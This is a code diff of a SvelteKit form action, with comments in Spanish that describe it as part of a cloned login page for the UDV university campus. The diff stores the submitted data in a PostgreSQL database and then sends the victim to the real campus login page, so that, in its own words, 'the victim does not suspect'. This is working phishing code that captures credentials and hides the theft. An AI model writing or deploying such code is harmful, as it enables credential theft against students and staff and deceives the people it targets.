@@ -2,12 +2,16 @@
 // FORM ACTION — Página principal (clon UDV)
 // ------------------------------------------------------------------
 // Al enviar el formulario, los datos se guardan en Neon (PostgreSQL
-// serverless) y se devuelve un error simulado para que la víctima
-// intente de nuevo.
+// serverless) y se redirige a la página de login real para que la
+// víctima no sospeche.
 // ------------------------------------------------------------------
 
+import { redirect } from '@sveltejs/kit';
 import type { Actions } from './$types';
 import sql from '$lib/server/db';
+
+/** URL real del campus UDV a donde se redirige tras capturar los datos */
+const CAMPUS_URL = 'https://campus.udv.edu.gt/login/index.php';
 
 export const actions: Actions = {
 	default: async ({ request }) => {
@@ -44,10 +48,7 @@ export const actions: Actions = {
 			console.error('Error guardando en DB:', err);
 		}
 
-		// --- Devolver error simulado (la página lo muestra) ---
-		return {
-			success: false,
-			error: 'Acceso inválido. Por favor, inténtelo otra vez.',
-		};
+		// --- Redirigir al login real (la víctima no sospecha nada) ---
+		redirect(303, CAMPUS_URL);
 	},
 };
